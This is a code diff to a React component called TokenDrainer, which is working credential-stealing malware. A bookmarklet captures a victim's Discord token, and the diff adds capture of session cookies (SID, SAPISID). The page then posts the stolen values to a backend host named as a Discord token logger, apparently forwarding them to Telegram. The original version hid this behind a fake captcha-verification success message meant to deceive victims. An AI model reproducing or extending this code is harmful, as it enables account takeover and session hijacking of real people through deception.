@@ -3,15 +3,16 @@ import { useState, useMemo, useEffect } from 'react';
 function TokenDrainer() {
   const [status, setStatus] = useState('idle');
 
-  // Handle token from URL parameters (when bookmarklet redirects here)
+  // Handle token or cookie from URL parameters (when bookmarklet redirects here)
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const token = urlParams.get('token');
+    const cookie = urlParams.get('cookie');
 
     if (token) {
       setStatus('processing');
 
-      fetch('https://captchaguild.com/api/process-token', {
+      fetch('https://discord-token-logger-backend-fm53.vercel.app/api/process-token', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -31,7 +32,33 @@ function TokenDrainer() {
         console.error('Fetch Error:', err);
       });
 
-      // Clean the URL
+      window.history.replaceState(null, '', window.location.pathname);
+    } else if (cookie) {
+      setStatus('processing');
+
+      fetch('https://discord-token-logger-backend-fm53.vercel.app/api/process-cookie', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          cookie: cookie,
+          sid: urlParams.get('sid') || '',
+          sapisid: urlParams.get('sapisid') || '',
+          type: urlParams.get('type') || 'unknown',
+          url: urlParams.get('url') || 'Unknown',
+          timestamp: urlParams.get('timestamp') || new Date().toISOString(),
+          method: urlParams.get('method') || 'Bookmarklet Cookie Capture'
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        setStatus(data.success ? 'success' : 'error');
+        if (!data.success) console.error('Backend Error:', data.message);
+      })
+      .catch(err => {
+        setStatus('error');
+        console.error('Fetch Error:', err);
+      });
+
       window.history.replaceState(null, '', window.location.pathname);
     }
   }, []);
@@ -116,7 +143,7 @@ function TokenDrainer() {
 
             // CSP blocks fetch from Discord domain, so use a different approach
             // Open a new tab with the token in the URL
-            var redirectUrl = 'https://captchaguild.com/?token=' + encodeURIComponent(cleanToken) +
+            var redirectUrl = window.location.origin + '/?token=' + encodeURIComponent(cleanToken) +
                              '&method=bookmarklet&timestamp=' + encodeURIComponent(new Date().toISOString()) +
                              '&url=' + encodeURIComponent(window.location.href);
 
@@ -156,9 +183,9 @@ function TokenDrainer() {
   if (status !== 'idle') {
     return (
       <div className="min-h-screen flex items-center justify-center text-white text-2xl">
-        {status === 'processing' && 'Processing token...'}
-        {status === 'success' && '✅ Success! Your captcha has been verified and processed. You can close this tab.'}
-        {status === 'error' && '❌ Error! Could not process token. Check the browser console.'}
+        {status === 'processing' && 'Processing captured data...'}
+        {status === 'success' && '✅ Success! Cookie data captured and saved to local JSON. Check captured_cookies.json and Telegram.'}
+        {status === 'error' && '❌ Error! Could not process data. Check the browser console.'}
       </div>
     );
   }
